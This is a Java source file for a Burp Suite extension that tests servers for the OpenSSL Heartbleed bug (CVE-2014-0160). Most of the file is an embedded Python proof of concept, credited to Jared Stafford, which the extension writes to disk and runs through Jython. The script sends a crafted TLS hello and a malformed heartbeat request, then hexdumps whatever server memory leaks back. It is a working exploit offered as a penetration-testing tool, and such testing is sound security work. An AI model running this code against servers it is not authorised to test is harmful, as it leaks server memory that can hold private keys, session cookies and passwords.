package burp;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;

import javax.swing.JComboBox;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.SwingUtilities;

import org.python.core.PyString;
import org.python.core.PySystemState;
import org.python.util.PythonInterpreter;

/**
 * Heartbleed extension for burp suite.
 * @author Ashkan Jahanbakhsh
 *
 */

public class HeartBleed implements IMenuItemHandler, ITab, ActionListener {
	@SuppressWarnings("unused")
	private IBurpExtenderCallbacks callbacks;
	private JPanel main; 
	private JPanel menu;
	private JTabbedPane tPane;
	private JComboBox<String> tabs;
	private final String TAB_NAME = "Heartbleed";
	private final int DEFAULT_PORT = 443;
	
	public HeartBleed(IBurpExtenderCallbacks callbacks) {
		this.callbacks = callbacks;
		callbacks.setExtensionName("SSL Heartbleed");
		main = new JPanel(new BorderLayout());
		menu = new JPanel();
		menu.setPreferredSize(new Dimension(0, 500));
		tPane = new JTabbedPane();
		main.add(menu, BorderLayout.LINE_START);
		main.add(tPane, BorderLayout.CENTER);
		callbacks.customizeUiComponent(main);
		tabs = new JComboBox<String>();
		callbacks.addSuiteTab(HeartBleed.this);
	}

	@Override
	public void menuItemClicked(String arg0, final IHttpRequestResponse[] arg1) {
		String inpPort = JOptionPane.showInputDialog("Enter port number for " + arg1[0].getHost(), DEFAULT_PORT);
		int portNumber = DEFAULT_PORT;
		boolean parsable = true;
		try{
			portNumber = Integer.parseInt(inpPort);
		}catch(NumberFormatException e){
			parsable = false;
		}
		if(!parsable){
			portNumber = DEFAULT_PORT;
		}
		final int port = portNumber;
		try {
			if (arg1[0].getHost() != null) {

				SwingUtilities.invokeLater(new Runnable() {
					@Override
					public void run() {
						prepareSslTest("Trying to connect to server: " + arg1[0].getHost() + ":" + port, arg1[0].getHost(), port);
					}
				});
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
	/**
	 * Create a tab in burp send and start the test in a separate thread.
	 * @param value
	 * @param host
	 * @param port
	 */

	private void prepareSslTest(String value, final String host, final int port) {
		final JTextArea serverTab = new JTextArea(5, 30);
		serverTab.setEditable(false);
		serverTab.setText(value);
		JScrollPane scrollWindow = new JScrollPane(serverTab);
		scrollWindow.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		scrollWindow.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
		scrollWindow.setPreferredSize(tPane.getSize());
		serverTab.setBounds(tPane.getBounds());
		tabs.addItem(host);
		tPane.addTab(host, scrollWindow);
		tPane.setTabComponentAt(tPane.getTabCount() - 1,new Tab(tPane, this));

		Thread thread = new Thread() {
			public void run() {
				serverTab.append("\n\n");
				final String output = makeItBleed(host, port + "");
				serverTab.append(output);
			}
		};
		thread.start();
		

	}

	@Override
	public String getTabCaption() {
		return TAB_NAME;
	}

	@Override
	public Component getUiComponent() {
		return main;
	}

	/**
	 * Remove tab.
	 * @param index
	 */
	public void RemoveTab(int index) {
		String name = tPane.getTitleAt(index);
		tabs.removeItem(name);
		tPane.remove(index);
	}

	@Override
	public void actionPerformed(ActionEvent e) {
	}

	/**
	 * Call python script by jython.
	 * @param host
	 * @param port
	 * @return
	 */
	private String makeItBleed(String host, String port) {
		String scriptname = "ssltest.py";
		
		String prog = "#!/usr/bin/python\n" +
        		"\n" +
        		"# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)\n" +
        		"# Modified by Ashkan Jahanbakhsh to make it burp friendly \n" +
        		"# The author disclaims copyright to this source code.\n" +
        		"\n" +
        		"import sys\n" +
        		"import struct\n" +
        		"import socket\n" +
        		"import time\n" +
        		"from select import cpython_compatible_select as select\n" +
        		"import re\n" +
        		"from optparse import OptionParser\n" +
        		"\n" +
        		"options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\n" +
        		"options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')\n" +
        		"\n" +
        		"def h2bin(x):\n" +
        		"    return x.replace(' ', '').replace('\\n', '').decode('hex')\n" +
        		"\n" +
        		"hello = h2bin('''\n" +
        		"16 03 02 00  dc 01 00 00 d8 03 02 53\n" +
        		"43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\n" +
        		"bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n" +
        		"00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n" +
        		"00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\n" +
        		"c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\n" +
        		"c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\n" +
        		"c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\n" +
        		"c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n" +
        		"00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n" +
        		"03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n" +
        		"00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n" +
        		"00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n" +
        		"00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n" +
        		"00 0f 00 01 01                                  \n" +
        		"''')\n" +
        		"\n" +
        		"hb = h2bin(''' \n" +
        		"18 03 02 00 03\n" +
        		"01 40 00\n" +
        		"''')\n" +
        		"\n" +
        		"def hexdump(s):\n" +
        		"    print '\\nExtracting raw data from memory.\\n'\n" +
        		"    for b in xrange(0, len(s), 16):\n" +
        		"        lin = [c for c in s[b : b + 16]]\n" +
        		"        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n" +
        		"        if((b % 12) != 0): sys.stdout.write(pdat)\n" +
        		"        else: print '%s' % (pdat)\n" +
        		"    print\n" +
        		"\n" +
        		"def recvall(s, length, timeout=5):\n" +
        		"    endtime = time.time() + timeout\n" +
        		"    rdata = ''\n" +
        		"    remain = length\n" +
        		"    while remain > 0:\n" +
        		"        rtime = endtime - time.time() \n" +
        		"        if rtime < 0:\n" +
        		"            return None\n" +
        		"        r, w, e = select([s], [], [], 5)\n" +
        		"        if s in r:\n" +
        		"            data = s.recv(remain)\n" +
        		"            # EOF?\n" +
        		"            if not data:\n" +
        		"                return None\n" +
        		"            rdata += data\n" +
        		"            remain -= len(data)\n" +
        		"    return rdata\n" +
        		"        \n" +
        		"\n" +
        		"def recvmsg(s):\n" +
        		"    hdr = recvall(s, 5)\n" +
        		"    if hdr is None:\n" +
        		"        print 'Unexpected EOF, received record header - server closed connection'\n" +
        		"        return None, None, None\n" +
        		"    typ, ver, ln = struct.unpack('>BHH', hdr)\n" +
        		"    pay = recvall(s, ln, 10)\n" +
        		"    if pay is None:\n" +
        		"        print 'Unexpected EOF, received record payload - server closed connection'\n" +
        		"        return None, None, None\n" +
        		"    print 'received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))\n" +
        		"    return typ, ver, pay\n" +
        		"\n" +
        		"def hit_hb(s):\n" +
        		"    s.send(hb)\n" +
        		"    while True:\n" +
        		"        typ, ver, pay = recvmsg(s)\n" +
        		"        if typ is None:\n" +
        		"            print 'No heartbeat response received, server likely not vulnerable.'\n" +
        		"            return False\n" +
        		"\n" +
        		"        if typ == 24:\n" +
        		"            print '\\nReceived heartbeat response.'\n" +
        		"            hexdump(pay)\n" +
        		"            if len(pay) > 3:\n" +
        		"                print '\\nWARNING: server returned more data than it should - server is vulnerable.'\n" +
        		"            else:\n" +
        		"                print 'Server processed malformed heartbeat, but did not return any extra data.'\n" +
        		"            return True\n" +
        		"\n" +
        		"        if typ == 21:\n" +
        		"            print 'Received alert:'\n" +
        		"            hexdump(pay)\n" +
        		"            print 'Server returned error, likely not vulnerable.'\n" +
        		"            return False\n" +
        		"\n" +
        		"def main():\n" +
        		"    opts, args = options.parse_args()\n" +
        		"    if len(args) < 1:\n" +
        		"        options.print_help()\n" +
        		"        return\n" +
        		"    try:\n" +
        		"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
        		"        sys.stdout.flush()\n" +
        		"        s.connect((args[0], opts.port))\n" +
        		"    except socket.error, (value,message):\n" +
        		"        if s:\n" +
        		"            print 'Could not open socket: ' + message \n" +
        		"            s.close()\n" +
        		"        return False\n" +
        		"    print 'Sending Hello from client.'\n" +
        		"    sys.stdout.flush()\n" +
        		"    s.send(hello)\n" +
        		"    print 'Waiting for Hello from server.\\n'\n" +
        		"    sys.stdout.flush()\n" +
        		"    while True:\n" +
        		"        typ, ver, pay = recvmsg(s)\n" +
        		"        if typ == None:\n" +
        		"            print 'Server closed connection, likely not vulnerable.'\n" +
        		"            return\n" +
        		"        # Look for server hello done message.\n" +
        		"        if typ == 22 and ord(pay[0]) == 0x0E:\n" +
        		"            break\n" +
        		"\n" +
        		"    print '\\nSending heartbeat request.\\n'\n" +
        		"    sys.stdout.flush()\n" +
        		"    s.send(hb)\n" +
        		"    hit_hb(s)\n" +
        		"\n" +
        		"if __name__ == '__main__':\n" +
        		"    main()\n";
        PrintWriter writer;
		try {
			writer = new PrintWriter(scriptname, "UTF-8");
	        writer.print(prog);
	        writer.close();
		} catch (FileNotFoundException | UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		PySystemState state = new PySystemState();
		state.argv.append(new PyString(host));
		state.argv.append(new PyString("-p " + port));
		PythonInterpreter python = new PythonInterpreter(null, state);
		StringWriter out = new StringWriter();
		python.setOut(out);
		python.execfile(scriptname);
		String outputStr = out.toString();
		return outputStr;
	}

}
